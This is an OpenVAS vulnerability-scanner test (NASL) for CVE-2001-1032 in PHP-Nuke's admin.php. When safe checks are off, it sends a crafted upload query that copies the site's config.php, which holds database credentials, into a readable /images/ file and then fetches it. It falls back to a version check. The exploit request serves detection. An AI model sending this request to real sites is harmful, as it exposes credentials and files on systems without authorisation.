# OpenVAS Vulnerability Test
# $Id: php_nuke_admin_cp.nasl 13975 2019-03-04 09:32:08Z cfischer $
# Description: PHP-Nuke copying files security vulnerability (admin.php)
#
# Authors:
# SecurITeam
# Updated: 2009/04/24
# Chandan S <schandan@secpod.com>
#
# Copyright:
# Copyright (C) 2001 SecurITeam
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

CPE = "cpe:/a:phpnuke:php-nuke";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10772");
  script_version("$Revision: 13975 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-04 10:32:08 +0100 (Mon, 04 Mar 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2001-1032");
  script_bugtraq_id(3361);
  script_name("PHP-Nuke copying files security vulnerability (admin.php)");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("This script is Copyright (C) 2001 SecurITeam");
  script_family("Web application abuses");
  script_dependencies("secpod_php_nuke_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("php-nuke/installed");

  script_tag(name:"summary", value:"Determine if a remote host is vulnerable to the admin.php vulnerability
  in PHP-Nuke.");

  script_tag(name:"vuldetect", value:"Try to upload a file and checks if it is accessible afterwards.");

  script_tag(name:"insight", value:"The remote host seems to be vulnerable to a security problem in
  PHP-Nuke (admin.php).

  The vulnerability is caused by inadequate processing of queries by PHP-Nuke's admin.php which enables
  attackers to copy any file from the operating system to anywhere else on the operating system.");

  script_tag(name:"impact", value:"Every file that the webserver has access to can be read by anyone.
  Furthermore, any file can be overwritten. Usernames (used for database access) can be compromised.
  Administrative privileges can be gained by copying sensitive files.");

  script_tag(name:"affected", value:"PHP-Nuke 5.2 and earlier, except 5.0RC1");

  script_tag(name:"solution", value:"Upgrade to Version 5.3 or above. As a workaround change the following lines
  in admin.php:

  if($upload)

  To:

  if(($upload) && ($admintest))");

  script_tag(name:"qod_type", value:"remote_banner");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("version_func.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! infos = get_app_version_and_location( cpe:CPE, port:port, exit_no_version:FALSE ) ) exit( 0 );

if( ! safe_checks( ) ) {

  if( ! dir = infos['location'] ) dir = "";
  if( dir == "/" ) dir = "";
  vtstrings = get_vt_strings();

  data = dir + "/admin.php?upload=1&file=config.php&file_name=" + vtstrings["lowercase"] + ".txt&wdir=/images/&userfile=config.php&userfile_name=" + vtstrings["lowercase"] + ".txt";
  req = http_get( item:data, port:port );
  buf = http_keepalive_send_recv( port:port, data:req );

  req = http_get( item:"/images/" + vtstrings["lowercase"] + ".txt", port:port );
  buf = http_keepalive_send_recv( port:port, data:req );

  if( ( "PHP-NUKE: Web Portal System" >< buf) && ( ( "?php" >< buf ) || ( "?PHP" >< buf ) ) ) {
    report = report_vuln_url( port:port, url:data );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

if( ! version = infos['version'] ) exit( 0 );

if( version_is_less_equal( version:version, test_version:"5.2" ) ) {
   report = report_fixed_ver( installed_version:version, fixed_version:"5.3" );
   security_message( port:port, data:report );
   exit( 0 );
}

exit( 99 );